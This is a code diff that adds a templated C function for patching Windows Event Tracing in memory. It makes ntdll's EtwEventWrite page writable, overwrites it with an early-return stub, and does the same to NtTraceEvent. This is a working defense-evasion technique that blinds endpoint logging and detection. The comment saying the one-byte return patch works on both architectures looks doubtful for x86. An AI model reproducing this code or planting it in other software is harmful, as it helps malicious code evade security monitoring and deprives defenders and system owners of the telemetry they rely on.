@@ -1,0 +1,50 @@
+void PatchETW####UUID####() {
+    // Determine architecture and select appropriate patch
+    #ifdef _WIN64
+        // x64 patch: xor rax, rax; ret
+        unsigned char etwPatch[] = { 0x48, 0x33, 0xc0, 0xc3 };
+        SIZE_T patchSize = sizeof(etwPatch);
+    #else
+        // x86 patch: ret 14
+        unsigned char etwPatch[] = { 0xc2, 0x14, 0x00 };
+        SIZE_T patchSize = sizeof(etwPatch);
+    #endif
+    
+    // Get handle to ntdll.dll and find EtwEventWrite
+    FARPROC pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
+    if (!pEtwEventWrite) {
+        return;
+    }
+    
+    // Change memory protection to allow writing
+    DWORD oldProtect = 0;
+    if (!VirtualProtect(pEtwEventWrite, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        return;
+    }
+    
+    // Write the patch
+    memcpy(pEtwEventWrite, etwPatch, patchSize);
+    
+    // Restore original memory protection
+    VirtualProtect(pEtwEventWrite, patchSize, oldProtect, &oldProtect);
+    
+    // Also patch NtTraceEvent if available
+    FARPROC pNtTraceEvent = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
+    if (pNtTraceEvent) {
+        // Simple ret patch (works for both x86 and x64)
+        unsigned char retPatch[] = { 0xc3 };
+        SIZE_T retPatchSize = sizeof(retPatch);
+        
+        // Change memory protection
+        if (VirtualProtect(pNtTraceEvent, retPatchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            // Write the patch
+            memcpy(pNtTraceEvent, retPatch, retPatchSize);
+            
+            // Restore protection
+            VirtualProtect(pNtTraceEvent, retPatchSize, oldProtect, &oldProtect);
+        }
+    }
+    
+    // Flush instruction cache to ensure the CPU executes our modified code
+    FlushInstructionCache(GetCurrentProcess(), NULL, 0);
+}
